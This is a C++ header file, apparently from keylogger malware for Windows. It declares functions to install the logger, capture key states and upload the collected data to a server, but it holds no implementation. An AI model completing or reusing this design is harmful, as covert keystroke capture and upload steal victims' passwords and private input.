#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <Windows.h>
#include <iostream>
#include <list>
#include <vector>


#include "structs.h"
#include "httpapi.h"

#include "..\Common\defines.h"
#include "..\Common\crypt.h"

using namespace std;
typedef struct{
	char vk_code;
	int status;
}_key;
typedef struct{
	string value;
	int numkey;
}_queue;
namespace KeyLogger{
	DWORD init(void);
	DWORD uninit(void);
	DWORD _uploadToServer(CORE_DATA* coreData);
	DWORD _install();
};
#endif